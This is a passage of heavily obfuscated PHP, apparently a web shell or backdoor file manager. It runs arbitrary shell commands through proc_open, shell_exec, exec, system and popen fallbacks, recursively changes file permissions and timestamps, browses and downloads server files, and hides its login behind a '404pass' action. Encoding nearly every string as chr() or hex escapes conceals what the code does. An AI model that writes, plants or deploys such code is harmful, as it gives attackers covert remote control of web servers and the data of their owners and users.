54).chr(51).chr(50).chr(49).chr(32).chr(67).chr(55).chr(51).chr(52).chr(46).chr(53).chr(57).chr(49).chr(53).chr(44).chr(53).chr(54).chr(57).chr(46).chr(51).chr(52).chr(53).chr(57).chr(48).chr(50).chr(32).chr(55).chr(51).chr(54).chr(46).chr(54).chr(48).chr(51).chr(44).chr(53).chr(54).chr(57).chr(46).chr(57).chr(57).chr(51).chr(52).chr(53).chr(56).chr(32).chr(55).chr(51).chr(54).chr(46).chr(54).chr(48).chr(51).chr(44).chr(53).chr(54).chr(57).chr(46).chr(57).chr(57).chr(51).chr(52).chr(53).chr(56).chr(32).chr(67).chr(55).chr(51).chr(55).chr(46).chr(57).chr(49).chr(50).chr(53).chr(44).chr(53).chr(55).chr(51).chr(46).chr(51).chr(49).chr(49).chr(48).chr(53).chr(56).chr(32).chr(55).chr(51).chr(55).chr(46).chr(48).chr(56).chr(57).chr(44).chr(53).chr(55).chr(53).chr(46).chr(55).chr(53).chr(57).chr(55).chr(50).chr(54).chr(32).chr(55).chr(51).chr(54).chr(46).chr(56).chr(52).chr(49).chr(53).chr(44).chr(53).chr(55).chr(54).chr(46).chr(51).chr(54).chr(57).chr(54).chr(51).chr(52).chr(32).chr(67).chr(55).chr(51).chr(56).chr(46).chr(51).chr(56).chr(48).chr(53).chr(44).chr(53).chr(55).chr(56).chr(46).chr(48).chr(53).chr(52).chr(55).chr(56).chr(56).chr(32).chr(55).chr(51).chr(57).chr(46).chr(51).chr(48).chr(57).chr(44).chr(53).chr(56).chr(48).chr(46).chr(50).chr(48).chr(53).chr(50).chr(55).chr(57).chr(32).chr(55).chr(51).chr(57).chr(46).chr(51).chr(48).chr(57).chr(44).chr(53).chr(56).chr(50).chr(46).chr(56).chr(51).chr(54).chr(49).chr(54).chr(55).chr(32).chr(67).chr(55).chr(51).chr(57).chr(46).chr(51).chr(48).chr(57).chr(44).chr(53).chr(57).chr(50).chr(46).chr(48).chr(57).chr(49).chr(55).chr(49).chr(50).chr(32).chr(55).chr(51).chr(51).chr(46).chr(54).chr(57).chr(55).chr(53).chr(44).chr(53).chr(57).chr(52).chr(46).chr(49).chr(50).chr(57).chr(50).chr(53).chr(55).chr(32).chr(55).chr(50).chr(56).chr(46).chr(51).chr(53).chr(49).chr(53).chr(44).chr(53).chr(57).chr(52).chr(46).chr(55).chr(50).chr(53).chr(54).chr(49).chr(50).chr(32).chr(67).chr(55).chr(50).chr(57).chr(46).chr(50).chr(49).chr(50).chr(53).chr(44).chr(53).chr(57).chr(53).chr(46).chr(52).chr(54).chr(57).chr(53).chr(52).chr(57).chr(32).chr(55).chr(50).chr(57).chr(46).chr(57).chr(56).chr(48).chr(53).chr(44).chr(53).chr(57).chr(54).chr(46).chr(57).chr(51).chr(57).chr(51).chr(53).chr(51).chr(32).chr(55).chr(50).chr(57).chr(46).chr(57).chr(56).chr(48).chr(53).chr(44).chr(53).chr(57).chr(57).chr(46).chr(49).chr(56).chr(55).chr(55).chr(51).chr(32).chr(67).chr(55).chr(50).chr(57).chr(46).chr(57).chr(56).chr(48).chr(53).chr(44).chr(54).chr(48).chr(50).chr(46).chr(52).chr(48).chr(56).chr(57).chr(52).chr(57).chr(32).chr(55).chr(50).chr(57).chr(46).chr(57).chr(53).chr(48).chr(53).chr(44).chr(54).chr(48).chr(53).chr(46).chr(48).chr(48).chr(54).chr(55).chr(48).chr(54).chr(32).chr(55).chr(50).chr(57).chr(46).chr(57).chr(53).chr(48).chr(53).chr(44).chr(54).chr(48).chr(53).chr(46).chr(55).chr(57).chr(55).chr(51).chr(50).chr(56).chr(32).chr(67).chr(55).chr(50).chr(57).chr(46).chr(57).chr(53).chr(48).chr(53).chr(44).chr(54).chr(48).chr(54).chr(46).chr(52).chr(52).chr(49).chr(56).chr(55).chr(51).chr(32).chr(55).chr(51).chr(48).chr(46).chr(51).chr(56).chr(50).chr(53).chr(44).chr(54).chr(48).chr(55).chr(46).chr(49).chr(57).chr(49).chr(56).chr(51).chr(52).chr(32).chr(55).chr(51).chr(49).chr(46).chr(54).chr(48).chr(48).chr(53).chr(44).chr(54).chr(48).chr(54).chr(46).chr(57).chr(53).chr(53).chr(52).chr(32).chr(67).chr(55).chr(52).chr(49).chr(46).chr(49).chr(51).chr(44).chr(54).chr(48).chr(51).chr(46).chr(55).chr(54).chr(50).chr(55).chr(57).chr(52).chr(32).chr(55).chr(52).chr(56).chr(44).chr(53).chr(57).chr(52).chr(46).chr(55).chr(51).chr(55).chr(54).chr(53).chr(57).chr(32).chr(55).chr(52).chr(56).chr(44).chr(53).chr(56).chr(52).chr(46).chr(48).chr(57).chr(54).chr(54).chr(52).chr(52).chr(32).chr(67).chr(55).chr(52).chr(56).chr(44).chr(53).chr(55).chr(48).chr(46).chr(55).chr(56).chr(55).chr(48).chr(57).chr(50).chr(32).chr(55).chr(51).chr(55).chr(46).chr(50).chr(53).chr(52).chr(44).chr(53).chr(54).chr(48).chr(32).chr(55).chr(50).chr(51).chr(46).chr(57).chr(57).chr(56).chr(53).chr(44).chr(53).chr(54).chr(48).chr(34).chr(47).chr(62).chr(60).chr(47).chr(103).chr(62).chr(60).chr(47).chr(103).chr(62).chr(60).chr(47).chr(115).chr(118).chr(103).chr(62),
        chr(105).chr(109).chr(103) => chr(60).chr(115).chr(118).chr(103).chr(32).chr(118).chr(105).chr(101).chr(119).chr(66).chr(111).chr(120).chr(61).chr(34).chr(48).chr(32).chr(48).chr(32).chr(50).chr(52).chr(32).chr(50).chr(52).chr(34).chr(32).chr(99).chr(108).chr(97).chr(115).chr(115).chr(61).chr(34) . $_35d7e8 . chr(34).chr(62).chr(60).chr(112).chr(97).chr(116).chr(104).chr(32).chr(100).chr(61).chr(34).chr(77).chr(52).chr(32).chr(53).chr(104).chr(49).chr(54).chr(118).chr(49).chr(52).chr(72).chr(52).chr(122).chr(34).chr(32).chr(102).chr(105).chr(108).chr(108).chr(61).chr(34).chr(99).chr(117).chr(114).chr(114).chr(101).chr(110).chr(116).chr(67).chr(111).chr(108).chr(111).chr(114).chr(34).chr(32).chr(111).chr(112).chr(97).chr(99).chr(105).chr(116).chr(121).chr(61).chr(34).chr(46).chr(49).chr(50).chr(34).chr(47).chr(62).chr(60).chr(99).chr(105).chr(114).chr(99).chr(108).chr(101).chr(32).chr(99).chr(120).chr(61).chr(34).chr(56).chr(46).chr(53).chr(34).chr(32).chr(99).chr(121).chr(61).chr(34).chr(57).chr(46).chr(53).chr(34).chr(32).chr(114).chr(61).chr(34).chr(49).chr(46).chr(53).chr(34).chr(32).chr(102).chr(105).chr(108).chr(108).chr(61).chr(34).chr(99).chr(117).chr(114).chr(114).chr(101).chr(110).chr(116).chr(67).chr(111).chr(108).chr(111).chr(114).chr(34).chr(47).chr(62).chr(60).chr(112).chr(97).chr(116).chr(104).chr(32).chr(100).chr(61).chr(34).chr(77).chr(52).chr(32).chr(49).chr(54).chr(108).chr(52).chr(45).chr(52).chr(32).chr(51).chr(32).chr(51).chr(32).chr(51).chr(45).chr(50).chr(32).chr(54).chr(32).chr(53).chr(34).chr(32).chr(102).chr(105).chr(108).chr(108).chr(61).chr(34).chr(110).chr(111).chr(110).chr(101).chr(34).chr(32).chr(115).chr(116).chr(114).chr(111).chr(107).chr(101).chr(61).chr(34).chr(99).chr(117).chr(114).chr(114).chr(101).chr(110).chr(116).chr(67).chr(111).chr(108).chr(111).chr(114).chr(34).chr(32).chr(115).chr(116).chr(114).chr(111).chr(107).chr(101).chr(45).chr(119).chr(105).chr(100).chr(116).chr(104).chr(61).chr(34).chr(50).chr(34).chr(32).chr(115).chr(116).chr(114).chr(111).chr(107).chr(101).chr(45).chr(108).chr(105).chr(110).chr(101).chr(99).chr(97).chr(112).chr(61).chr(34).chr(114).chr(111).chr(117).chr(110).chr(100).chr(34).chr(47).chr(62).chr(60).chr(47).chr(115).chr(118).chr(103).chr(62),
        chr(112).chr(100).chr(102) => "\x3c\x73\x76\x67\x20\x76\x69\x65\x77\x42\x6f\x78\x3d\x22\x30\x20\x30\x20\x32\x34\x20\x32\x34\x22\x20\x63\x6c\x61\x73\x73\x3d\x22" . $_35d7e8 . "\x22\x3e\x3c\x70\x61\x74\x68\x20\x64\x3d\x22\x4d\x36\x20\x33\x68\x37\x6c\x35\x20\x35\x76\x31\x31\x61\x32\x20\x32\x20\x30\x20\x30\x31\x2d\x32\x20\x32\x48\x36\x61\x32\x20\x32\x20\x30\x20\x30\x31\x2d\x32\x2d\x32\x56\x35\x22\x20\x66\x69\x6c\x6c\x3d\x22\x63\x75\x72\x72\x65\x6e\x74\x43\x6f\x6c\x6f\x72\x22\x20\x6f\x70\x61\x63\x69\x74\x79\x3d\x22\x2e\x31\x32\x22\x2f\x3e\x3c\x74\x65\x78\x74\x20\x78\x3d\x22\x37\x22\x20\x79\x3d\x22\x31\x37\x22\x20\x66\x6f\x6e\x74\x2d\x73\x69\x7a\x65\x3d\x22\x38\x22\x20\x66\x6f\x6e\x74\x2d\x66\x61\x6d\x69\x6c\x79\x3d\x22\x75\x69\x2d\x73\x61\x6e\x73\x2d\x73\x65\x72\x69\x66\x22\x20\x66\x69\x6c\x6c\x3d\x22\x63\x75\x72\x72\x65\x6e\x74\x43\x6f\x6c\x6f\x72\x22\x3e\x50\x44\x46\x3c\x2f\x74\x65\x78\x74\x3e\x3c\x2f\x73\x76\x67\x3e",
        chr(115).chr(104).chr(101).chr(101).chr(116) => chr(60).chr(115).chr(118).chr(103).chr(32).chr(118).chr(105).chr(101).chr(119).chr(66).chr(111).chr(120).chr(61).chr(34).chr(48).chr(32).chr(48).chr(32).chr(50).chr(52).chr(32).chr(50).chr(52).chr(34).chr(32).chr(99).chr(108).chr(97).chr(115).chr(115).chr(61).chr(34) . $_35d7e8 . "\x22\x3e\x3c\x70\x61\x74\x68\x20\x64\x3d\x22\x4d\x36\x20\x33\x68\x31\x32\x61\x32\x20\x32\x20\x30\x20\x30\x31\x32\x20\x32\x76\x31\x34\x61\x32\x20\x32\x20\x30\x20\x30\x31\x2d\x32\x20\x32\x48\x36\x61\x32\x20\x32\x20\x30\x20\x30\x31\x2d\x32\x2d\x32\x56\x35\x22\x20\x66\x69\x6c\x6c\x3d\x22\x63\x75\x72\x72\x65\x6e\x74\x43\x6f\x6c\x6f\x72\x22\x20\x6f\x70\x61\x63\x69\x74\x79\x3d\x22\x2e\x31\x32\x22\x2f\x3e\x3c\x70\x61\x74\x68\x20\x64\x3d\x22\x4d\x38\x20\x38\x68\x38\x4d\x38\x20\x31\x32\x68\x38\x4d\x38\x20\x31\x36\x68\x38\x22\x20\x73\x74\x72\x6f\x6b\x65\x3d\x22\x63\x75\x72\x72\x65\x6e\x74\x43\x6f\x6c\x6f\x72\x22\x20\x73\x74\x72\x6f\x6b\x65\x2d\x77\x69\x64\x74\x68\x3d\x22\x32\x22\x2f\x3e\x3c\x2f\x73\x76\x67\x3e",
        "\x7a\x69\x70" => chr(60).chr(115).chr(118).chr(103).chr(32).chr(118).chr(105).chr(101).chr(119).chr(66).chr(111).chr(120).chr(61).chr(34).chr(48).chr(32).chr(48).chr(32).chr(50).chr(52).chr(32).chr(50).chr(52).chr(34).chr(32).chr(99).chr(108).chr(97).chr(115).chr(115).chr(61).chr(34) . $_35d7e8 . "\x22\x3e\x3c\x70\x61\x74\x68\x20\x64\x3d\x22\x4d\x36\x20\x33\x68\x37\x6c\x35\x20\x35\x76\x31\x31\x61\x32\x20\x32\x20\x30\x20\x30\x31\x2d\x32\x20\x32\x48\x36\x61\x32\x20\x32\x20\x30\x20\x30\x31\x2d\x32\x2d\x32\x56\x35\x22\x20\x66\x69\x6c\x6c\x3d\x22\x63\x75\x72\x72\x65\x6e\x74\x43\x6f\x6c\x6f\x72\x22\x20\x6f\x70\x61\x63\x69\x74\x79\x3d\x22\x2e\x31\x32\x22\x2f\x3e\x3c\x70\x61\x74\x68\x20\x64\x3d\x22\x4d\x31\x31\x20\x35\x68\x32\x76\x32\x68\x2d\x32\x76\x32\x68\x32\x76\x32\x68\x2d\x32\x22\x20\x73\x74\x72\x6f\x6b\x65\x3d\x22\x63\x75\x72\x72\x65\x6e\x74\x43\x6f\x6c\x6f\x72\x22\x20\x73\x74\x72\x6f\x6b\x65\x2d\x77\x69\x64\x74\x68\x3d\x22\x32\x22\x2f\x3e\x3c\x2f\x73\x76\x67\x3e",
        chr(100).chr(98) => "\x3c\x73\x76\x67\x20\x76\x69\x65\x77\x42\x6f\x78\x3d\x22\x30\x20\x30\x20\x32\x34\x20\x32\x34\x22\x20\x63\x6c\x61\x73\x73\x3d\x22" . $_35d7e8 . "\x22\x3e\x3c\x65\x6c\x6c\x69\x70\x73\x65\x20\x63\x78\x3d\x22\x31\x32\x22\x20\x63\x79\x3d\x22\x36\x22\x20\x72\x78\x3d\x22\x38\x22\x20\x72\x79\x3d\x22\x33\x22\x20\x66\x69\x6c\x6c\x3d\x22\x63\x75\x72\x72\x65\x6e\x74\x43\x6f\x6c\x6f\x72\x22\x20\x6f\x70\x61\x63\x69\x74\x79\x3d\x22\x2e\x31\x32\x22\x2f\x3e\x3c\x70\x61\x74\x68\x20\x64\x3d\x22\x4d\x34\x20\x36\x76\x31\x32\x63\x30\x20\x31\x2e\x37\x20\x33\x2e\x36\x20\x33\x20\x38\x20\x33\x73\x38\x2d\x31\x2e\x33\x20\x38\x2d\x33\x56\x36\x22\x20\x66\x69\x6c\x6c\x3d\x22\x6e\x6f\x6e\x65\x22\x20\x73\x74\x72\x6f\x6b\x65\x3d\x22\x63\x75\x72\x72\x65\x6e\x74\x43\x6f\x6c\x6f\x72\x22\x20\x73\x74\x72\x6f\x6b\x65\x2d\x77\x69\x64\x74\x68\x3d\x22\x32\x22\x2f\x3e\x3c\x2f\x73\x76\x67\x3e",
        "\x73\x65\x61\x72\x63\x68" => "\x3c\x73\x76\x67\x20\x76\x69\x65\x77\x42\x6f\x78\x3d\x22\x30\x20\x30\x20\x32\x34\x20\x32\x34\x22\x20\x63\x6c\x61\x73\x73\x3d\x22" . $_35d7e8 . "\x22\x3e\x3c\x63\x69\x72\x63\x6c\x65\x20\x63\x78\x3d\x22\x31\x31\x22\x20\x63\x79\x3d\x22\x31\x31\x22\x20\x72\x3d\x22\x37\x22\x20\x73\x74\x72\x6f\x6b\x65\x3d\x22\x63\x75\x72\x72\x65\x6e\x74\x43\x6f\x6c\x6f\x72\x22\x20\x73\x74\x72\x6f\x6b\x65\x2d\x77\x69\x64\x74\x68\x3d\x22\x32\x22\x20\x66\x69\x6c\x6c\x3d\x22\x6e\x6f\x6e\x65\x22\x2f\x3e\x3c\x70\x61\x74\x68\x20\x64\x3d\x22\x4d\x32\x30\x20\x32\x30\x6c\x2d\x33\x2d\x33\x22\x20\x73\x74\x72\x6f\x6b\x65\x3d\x22\x63\x75\x72\x72\x65\x6e\x74\x43\x6f\x6c\x6f\x72\x22\x20\x73\x74\x72\x6f\x6b\x65\x2d\x77\x69\x64\x74\x68\x3d\x22\x32\x22\x20\x73\x74\x72\x6f\x6b\x65\x2d\x6c\x69\x6e\x65\x63\x61\x70\x3d\x22\x72\x6f\x75\x6e\x64\x22\x2f\x3e\x3c\x2f\x73\x76\x67\x3e",
    );
    return isset($_85ae2d[$_201cba]) ? $_85ae2d[$_201cba] : $_85ae2d[chr(102).chr(105).chr(108).chr(101)];
}
function _f4cf4de7c($_60dcf7)
{
    if (is_dir($_60dcf7))
        return _f9c42d19e("\x66\x6f\x6c\x64\x65\x72");
    $_90e0bb = strtolower(pathinfo($_60dcf7, PATHINFO_EXTENSION));
    if (in_array($_90e0bb, array(chr(122).chr(105).chr(112), chr(114).chr(97).chr(114), chr(55).chr(122))))
        return _f9c42d19e(chr(122).chr(105).chr(112));
    if (in_array($_90e0bb, array(chr(106).chr(112).chr(103), chr(106).chr(112).chr(101).chr(103), chr(112).chr(110).chr(103), "\x67\x69\x66", "\x77\x65\x62\x70", "\x62\x6d\x70", "\x73\x76\x67")))
        return _f9c42d19e(chr(105).chr(109).chr(103));
    if (in_array($_90e0bb, array("\x70\x64\x66")))
        return _f9c42d19e(chr(112).chr(100).chr(102));
    if (in_array($_90e0bb, array("\x63\x73\x76", "\x78\x6c\x73", "\x78\x6c\x73\x78")))
        return _f9c42d19e(chr(115).chr(104).chr(101).chr(101).chr(116));
    if (in_array($_90e0bb, array(chr(115).chr(113).chr(108))))
        return _f9c42d19e(chr(100).chr(98));
    if (in_array($_90e0bb, array("\x70\x68\x70", chr(106).chr(115), "\x74\x73", "\x63\x73\x73", "\x73\x63\x73\x73", chr(108).chr(101).chr(115).chr(115), "\x68\x74\x6d\x6c", "\x68\x74\x6d", "\x78\x6d\x6c", chr(121).chr(109).chr(108), chr(121).chr(97).chr(109).chr(108), "\x69\x6e\x69", "\x63\x66\x67")))
        return _f9c42d19e(chr(99).chr(111).chr(100).chr(101));
    if (in_array($_90e0bb, array("\x74\x78\x74", chr(109).chr(100), chr(108).chr(111).chr(103), "\x6a\x73\x6f\x6e")))
        return _f9c42d19e(chr(116).chr(101).chr(120).chr(116));
    return _f9c42d19e(chr(102).chr(105).chr(108).chr(101));
}


if (!function_exists("\x6d\x61\x6b\x65\x5f\x63\x64\x5f\x70\x72\x65\x66\x69\x78")) {
    function make_cd_prefix($_343e5c)
    {
        if (!$_343e5c)
            return '';
        if (DIRECTORY_SEPARATOR === chr(92))
            return chr(99).chr(100).chr(32).chr(47).chr(100).chr(32) . escapeshellarg($_343e5c) . chr(32).chr(38).chr(38).chr(32);
        return chr(99).chr(100).chr(32) . escapeshellarg($_343e5c) . "\x20\x26\x26\x20";
    }
}
if (!function_exists("\x77\x72\x61\x70\x5f\x63\x6d\x64\x5f\x66\x6f\x72\x5f\x73\x68\x65\x6c\x6c")) {
    function wrap_cmd_for_shell($_ddf0bf)
    {
        if (DIRECTORY_SEPARATOR === chr(92))
            return "\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x43\x20" . $_ddf0bf;
        return "\x2f\x62\x69\x6e\x2f\x73\x68\x20\x2d\x63\x20" . escapeshellarg($_ddf0bf);
    }
}


if (!function_exists(chr(114).chr(117).chr(110).chr(95).chr(119).chr(105).chr(116).chr(104).chr(95).chr(112).chr(114).chr(111).chr(99).chr(95).chr(111).chr(112).chr(101).chr(110))) {
    function run_with_proc_open($_ddf0bf, $_343e5c = null, $_d4ea0d = 30)
    {
        if (!is_fn_usable(chr(112).chr(114).chr(111).chr(99).chr(95).chr(111).chr(112).chr(101).chr(110)))
            return null;
        $_02e2c8 = array(0 => array(chr(112).chr(105).chr(112).chr(101), "\x72"), 1 => array(chr(112).chr(105).chr(112).chr(101), "\x77"), 2 => array(chr(112).chr(105).chr(112).chr(101), "\x77"));
        $_1be113 = array();
        $_755d29 = @proc_open($_ddf0bf, $_02e2c8, $_1be113, $_343e5c ?: null, null);
        if (!is_resource($_755d29))
            return null;
        if (isset($_1be113[1]) && is_resource($_1be113[1]))
            @stream_set_blocking($_1be113[1], false);
        if (isset($_1be113[2]) && is_resource($_1be113[2]))
            @stream_set_blocking($_1be113[2], false);
        if (isset($_1be113[0]) && is_resource($_1be113[0]))
            @fclose($_1be113[0]);
        $_42a91c = '';
        $_cc0151 = time();
        while (true) {
            $_b5f5e3 = @proc_get_status($_755d29);
            $_124ae6 = $_b5f5e3 && !empty($_b5f5e3["\x72\x75\x6e\x6e\x69\x6e\x67"]);
            $_1121de = array();
            if (isset($_1be113[1]) && is_resource($_1be113[1]))
                $_1121de[] = $_1be113[1];
            if (isset($_1be113[2]) && is_resource($_1be113[2]))
                $_1121de[] = $_1be113[2];
            if ($_1121de) {
                $_0980b5 = null;
                $_90e0bb = null;
                @stream_select($_1121de, $_0980b5, $_90e0bb, 1);
                foreach ($_1121de as $_60dcf7) {
                    $_82a54d = @fread($_60dcf7, 8192);
                    if ($_82a54d !== false && $_82a54d !== '')
                        $_42a91c .= $_82a54d;
                }
            }
            else {
                usleep(100000);
            }
            if (!$_124ae6)
                break;
            if ($_d4ea0d > 0 && (time() - $_cc0151) >= $_d4ea0d) {
                @proc_terminate($_755d29, 9);
                foreach ($_1be113 as $_60dcf7) {
                    if (is_resource($_60dcf7))
                        @fclose($_60dcf7);
                }
                @proc_close($_755d29);
                return array(chr(109).chr(101).chr(116).chr(104).chr(111).chr(100) => "\x70\x72\x6f\x63\x5f\x6f\x70\x65\x6e", "\x63\x6f\x64\x65" => 124, "\x6f\x75\x74" => $_42a91c . "\n[timeout after {$_d4ea0d}s]");
            }
        }
        foreach ($_1be113 as $_60dcf7) {
            if (is_resource($_60dcf7))
                @fclose($_60dcf7);
        }
        $_57a160 = @proc_close($_755d29);
        if ($_57a160 === -1)
            $_57a160 = null;
        return array("\x6d\x65\x74\x68\x6f\x64" => "\x70\x72\x6f\x63\x5f\x6f\x70\x65\x6e", "\x63\x6f\x64\x65" => $_57a160, chr(111).chr(117).chr(116) => $_42a91c);
    }
}
if (!function_exists("\x72\x75\x6e\x5f\x77\x69\x74\x68\x5f\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63")) {
    function run_with_shell_exec($_ddf0bf, $_343e5c = null)
    {
        if (!is_fn_usable(chr(115).chr(104).chr(101).chr(108).chr(108).chr(95).chr(101).chr(120).chr(101).chr(99)))
            return null;
        $_6812dc = make_cd_prefix($_343e5c) . $_ddf0bf . chr(32).chr(50).chr(62).chr(38).chr(49);
        $_be5191 = @shell_exec($_6812dc);
        if ($_be5191 === null)
            return null;
        return array("\x6d\x65\x74\x68\x6f\x64" => chr(115).chr(104).chr(101).chr(108).chr(108).chr(95).chr(101).chr(120).chr(101).chr(99), "\x63\x6f\x64\x65" => null, chr(111).chr(117).chr(116) => $_be5191);
    }
}
if (!function_exists("\x72\x75\x6e\x5f\x77\x69\x74\x68\x5f\x65\x78\x65\x63")) {
    function run_with_exec($_ddf0bf, $_343e5c = null)
    {
        if (!is_fn_usable("\x65\x78\x65\x63"))
            return null;
        $_6812dc = make_cd_prefix($_343e5c) . $_ddf0bf . chr(32).chr(50).chr(62).chr(38).chr(49);
        $_d0a499 = array();
        $_57a160 = 0;
        @exec($_6812dc, $_d0a499, $_57a160);
        return array("\x6d\x65\x74\x68\x6f\x64" => chr(101).chr(120).chr(101).chr(99), "\x63\x6f\x64\x65" => $_57a160, chr(111).chr(117).chr(116) => implode("\x0a", (array)$_d0a499));
    }
}
if (!function_exists("\x72\x75\x6e\x5f\x77\x69\x74\x68\x5f\x73\x79\x73\x74\x65\x6d")) {
    function run_with_system($_ddf0bf, $_343e5c = null)
    {
        if (!is_fn_usable("\x73\x79\x73\x74\x65\x6d"))
            return null;
        $_6812dc = make_cd_prefix($_343e5c) . $_ddf0bf . chr(32).chr(50).chr(62).chr(38).chr(49);
        ob_start();
        @system($_6812dc, $_57a160);
        $_be5191 = ob_get_clean();
        return array("\x6d\x65\x74\x68\x6f\x64" => chr(115).chr(121).chr(115).chr(116).chr(101).chr(109), chr(99).chr(111).chr(100).chr(101) => $_57a160, chr(111).chr(117).chr(116) => $_be5191);
    }
}
if (!function_exists("\x72\x75\x6e\x5f\x77\x69\x74\x68\x5f\x70\x6f\x70\x65\x6e")) {
    function run_with_popen($_ddf0bf, $_343e5c = null)
    {
        if (!is_fn_usable("\x70\x6f\x70\x65\x6e"))
            return null;
        $_6812dc = make_cd_prefix($_343e5c) . $_ddf0bf . chr(32).chr(50).chr(62).chr(38).chr(49);
        $_097a3e = @popen(wrap_cmd_for_shell($_6812dc), chr(114));
        if (!is_resource($_097a3e))
            return null;
        $_42a91c = "";
        while (!feof($_097a3e)) {
            $_82a54d = @fread($_097a3e, 8192);
            if ($_82a54d === false)
                break;
            $_42a91c .= $_82a54d;
        }
        @pclose($_097a3e);
        return array("\x6d\x65\x74\x68\x6f\x64" => "\x70\x6f\x70\x65\x6e", "\x63\x6f\x64\x65" => null, "\x6f\x75\x74" => $_42a91c);
    }
}
if (!function_exists(chr(114).chr(117).chr(110).chr(95).chr(99).chr(111).chr(109).chr(109).chr(97).chr(110).chr(100).chr(95).chr(97).chr(108).chr(108))) {
    function run_command_all($_ddf0bf, $_343e5c = null)
    {
        $_e2bd06 = run_with_proc_open($_ddf0bf, $_343e5c, 30);
        if ($_e2bd06)
            return $_e2bd06;
        $_19cf3d = array("\x72\x75\x6e\x5f\x77\x69\x74\x68\x5f\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63", "\x72\x75\x6e\x5f\x77\x69\x74\x68\x5f\x65\x78\x65\x63", chr(114).chr(117).chr(110).chr(95).chr(119).chr(105).chr(116).chr(104).chr(95).chr(115).chr(121).chr(115).chr(116).chr(101).chr(109), chr(114).chr(117).chr(110).chr(95).chr(119).chr(105).chr(116).chr(104).chr(95).chr(112).chr(111).chr(112).chr(101).chr(110));
        foreach ($_19cf3d as $_c820c0) {
            if (function_exists($_c820c0)) {
                $_0b568e = $_c820c0($_ddf0bf, $_343e5c);
                if ($_0b568e)
                    return $_0b568e;
            }
        }
        return array("\x6d\x65\x74\x68\x6f\x64" => chr(110).chr(111).chr(110).chr(101), "\x63\x6f\x64\x65" => 127, chr(111).chr(117).chr(116) => "\x43\x6f\x6d\x6d\x61\x6e\x64\x20\x72\x75\x6e\x6e\x65\x72\x20\x6e\x6f\x74\x20\x61\x76\x61\x69\x6c\x61\x62\x6c\x65\x20\x6f\x6e\x20\x74\x68\x69\x73\x20\x50\x48\x50\x20\x62\x75\x69\x6c\x64\x2e");
    }
}


function _f723a3385($_a1c28d, $_ddf387, $_53be83, &$_f10de9)
{
    if (!@chmod($_a1c28d, $_ddf387))
        $_f10de9 = false;
    if ($_53be83 && is_dir($_a1c28d)) {
        $_097a3e = @opendir($_a1c28d);
        if ($_097a3e !== false) {
            while (false !== ($_1bb0e6 = readdir($_097a3e))) {
                if ($_1bb0e6 === "\x2e" || $_1bb0e6 === "\x2e\x2e")
                    continue;
                _f723a3385($_a1c28d . DIRECTORY_SEPARATOR . $_1bb0e6, $_ddf387, true, $_f10de9);
            }
            closedir($_097a3e);
        }
        else {
            $_f10de9 = false;
        }
    }
}
function _fc3481723($_a1c28d, $_55e8f2, $_53be83, &$_f10de9)
{
    if (!@touch($_a1c28d, $_55e8f2, $_55e8f2))
        $_f10de9 = false;
    if ($_53be83 && is_dir($_a1c28d)) {
        $_097a3e = @opendir($_a1c28d);
        if ($_097a3e !== false) {
            while (false !== ($_1bb0e6 = readdir($_097a3e))) {
                if ($_1bb0e6 === "\x2e" || $_1bb0e6 === chr(46).chr(46))
                    continue;
                _fc3481723($_a1c28d . DIRECTORY_SEPARATOR . $_1bb0e6, $_55e8f2, true, $_f10de9);
            }
            closedir($_097a3e);
        }
        else {
            $_f10de9 = false;
        }
    }
}


$_7d57a6 = isset($_GET["\x70"]) ? (string)$_GET[chr(112)] : getcwd();
if (!is_dir($_7d57a6))
    $_7d57a6 = getcwd();
$_7d57a6 = rtrim($_7d57a6, DIRECTORY_SEPARATOR);
if ($_7d57a6 === '')
    $_7d57a6 = DIRECTORY_SEPARATOR;

$_9111db = isset($_GET[chr(97)]) ? $_GET[chr(97)] : "";


if ($_9111db === chr(52).chr(48).chr(52).chr(112).chr(97).chr(115).chr(115) && $_SERVER[chr(82).chr(69).chr(81).chr(85).chr(69).chr(83).chr(84).chr(95).chr(77).chr(69).chr(84).chr(72).chr(79).chr(68)] === "\x50\x4f\x53\x54") {
    _fbaa772a9();
    $_60dcf7 = isset($_POST["\x70\x61\x73\x73"]) ? $_POST["\x70\x61\x73\x73"] : '';
    if (_f2d3fa2ee($_60dcf7, AUTH_PASS_HASH)) {
        $_SESSION["\x61\x75\x74\x68"] = true;
        $_SESSION["\x77\x68\x6f"] = AUTH_USER;
        header("\x4c\x6f\x63\x61\x74\x69\x6f\x6e\x3a\x20\x3f\x70\x3d" . rawurlencode($_7d57a6));
        exit;
    }
    _f7220854a();
    exit;
}
if ($_9111db === chr(108).chr(111).chr(103).chr(105).chr(110) && $_SERVER["\x52\x45\x51\x55\x45\x53\x54\x5f\x4d\x45\x54\x48\x4f\x44"] === chr(80).chr(79).chr(83).chr(84)) {
    _fbaa772a9();
    $_a5838a = isset($_POST[chr(117).chr(115).chr(101).chr(114)]) ? $_POST["\x75\x73\x65\x72"] : "";
    $_60dcf7 = isset($_POST["\x70\x61\x73\x73"]) ? $_POST["\x70\x61\x73\x73"] : "";
    if (_f6f31fc12($_a5838a, $_60dcf7)) {
        $_SESSION[chr(97).chr(117).chr(116).chr(104)] = true;
        $_SESSION[chr(119).chr(104).chr(111)] = $_a5838a;
        header(chr(76).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(63).chr(112).chr(61) . rawurlencode($_7d57a6));
        exit;
    }
    else {
        _f757b5aa5("\x49\x6e\x63\x6f\x72\x72\x65\x63\x74\x20\x75\x73\x65\x72\x6e\x61\x6d\x65\x20\x6f\x72\x20\x70\x61\x73\x73\x77\x6f\x72\x64");
        exit;
    }
}
if (empty($_SESSION["\x61\x75\x74\x68"])) {
    _f757b5aa5();
    exit;
}


if ($_9111db === "\x64\x6f\x77\x6e\x6c\x6f\x61\x64") {
    $_609105 = _f9773869f($_7d57a6, isset($_GET["\x66"]) ? $_GET[chr(102)] : '');
    if (!is_file($_609105) || !is_readable($_609105)) {
        http_response_code(404);
        exit("\x4e\x6f\x74\x20\x66\x6f\x75\x6e\x64");
    }
    header(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(68).chr(101).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(70).chr(105).chr(108).chr(101).chr(32).chr(84).chr(114).chr(97).chr(110).chr(115).chr(102).chr(101).chr(114));
